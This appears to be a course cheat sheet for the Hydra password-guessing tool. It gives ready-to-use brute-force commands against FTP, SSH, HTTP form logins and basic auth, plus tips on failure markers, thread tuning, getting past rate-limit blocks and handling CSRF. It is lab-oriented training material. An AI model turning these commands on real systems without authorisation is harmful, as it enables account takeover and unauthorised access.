# 28. SAL1 — Offensive Security Tooling: Hydra (Cheat Sheet)

## TL;DR

Hydra is a fast online password-guessing tool supporting many protocols (SSH, HTTP(S) forms, FTP, RDP, SMB, IMAP/POP3/SMTP, MySQL/Postgres, etc.). Use targeted wordlists, tune threads, and identify **failure markers** for web forms.  

---

## Install / Environment

* Preinstalled on AttackBox & Kali; other distros: `apt install hydra` (Ubuntu) / `dnf install hydra` (Fedora). 

---

## Core Syntax & Options

```bash
hydra [options] <target> <module> [module-options]
```

* `-l` single username / `-L` username list
* `-p` single password / `-P` password list
* `-t` threads (parallel attempts)
* `-V` verbose (show every try)
* Typical success shows “login: <user>   password: <pass>”.

Example (FTP):

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```



---

## SSH (Online bruteforce)

```bash
# Basic
hydra -l <username> -P <path/to/wordlist> MACHINE_IP -t 4 ssh
# Example
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```

* `-l` username, `-P` password list, `-t` threads.  

---

## HTTP(S) Form (POST)

**Pattern:**

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form \
"<path>:<login_credentials>:<invalid_response>" -V
```

* `<path>`: login endpoint (e.g., `/login` or `/`)
* `<login_credentials>`: `username=^USER^&password=^PASS^`
* `<invalid_response>`: string that appears **when login fails** (e.g., `F=incorrect`)
* `-V`: show each attempt
   

**Concrete example:**

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form \
"/:username=^USER^&password=^PASS^:F=incorrect" -V
```

 

> Tip: Identify **method**, **field names**, and an **invalid marker** via browser DevTools → Network (look at the POST request and server response).

## HTTP(S) Form (GET)

If the login form submits with GET (rare), change module to `http-get-form` and keep the same pattern:

```bash
hydra -l <user> -P <wordlist> MACHINE_IP http-get-form \
"/login?username=^USER^&password=^PASS^:F=incorrect" -V
```

(Generalization from the POST pattern shown above.)

## HTTP Basic/Digest Auth

```bash
# Basic auth against /admin
hydra -L users.txt -P passwords.txt MACHINE_IP http-get \
"/admin:Authorization=Basic"
```

*(Hydra supports many HTTP modes; choose the correct module per target banner/behavior.)*

## Tuning & Hygiene

* Start with **known/likely usernames**; keep wordlists tight to avoid lockouts.
* Tune `-t` to match server stability/rate limits (e.g., 4–8); avoid DoS.
* For web forms, verify the **failure marker** is accurate; wrong markers → false positives/negatives. 
* Work only on **authorized** lab targets.

## Quick Troubleshooting

* **No hits?** Confirm field names, method (GET/POST), path, and **failure marker**.
* **All attempts “succeed”?** Your failure marker is too generic or inverted.
* **Blocked fast?** Lower `-t`, add delay (`-W` waittime), or throttle attempts.
* **Form behind CSRF?** Some apps need additional fields/headers; capture them and include in the `http-post-form` string.
